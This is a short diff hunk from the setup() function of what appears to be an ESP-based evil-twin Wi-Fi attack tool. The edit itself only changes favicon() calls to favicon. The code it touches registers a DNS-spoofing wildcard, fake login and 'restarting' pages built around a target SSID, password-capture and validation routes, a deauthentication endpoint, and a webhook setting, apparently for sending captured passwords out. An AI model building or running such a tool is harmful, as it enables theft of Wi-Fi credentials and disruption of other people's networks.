@@ -228,21 +228,21 @@ void setup(){
   Serial.printf("Target SSID: %s\n", targetSSID.c_str());
   Serial.printf("DNS server setup: %s\n", dnsServer.start(DNS_PORT, "*", APIP) ? "Sucessfully!" : "Failed!"); //DNS spoofing (Only for HTTP)
 
-  webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon(), targetSSID)); });
+  webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
   webServer.on("/post", handlePost);
-  webServer.on("/restarting", []() {  webServer.send(200, "text/html", Fixing(indexLang, favicon(), targetSSID)); });
+  webServer.on("/restarting", []() {  webServer.send(200, "text/html", Fixing(indexLang, favicon, targetSSID)); });
   webServer.on("/dashboard", handleDashboard);
   webServer.on("/clearPass", clearPass);
   webServer.on("/language", handleLang);
   webServer.on("/deauth", handleDeauth);
   webServer.on("/stop", stopDeauth);
-  webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, favicon(), targetSSID)); });
+  webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, favicon, targetSSID)); });
   webServer.on("/ssid", handlePostSSID);
   webServer.on("/validate", setValidate);
   webServer.on("/webhook", setWebhookUrl);
   
   
-  webServer.onNotFound([](){  webServer.send(200, "text/html", Index(indexLang, favicon(), targetSSID)); });
+  webServer.onNotFound([](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
   webServer.begin();
 
   //Enable the built-in LED
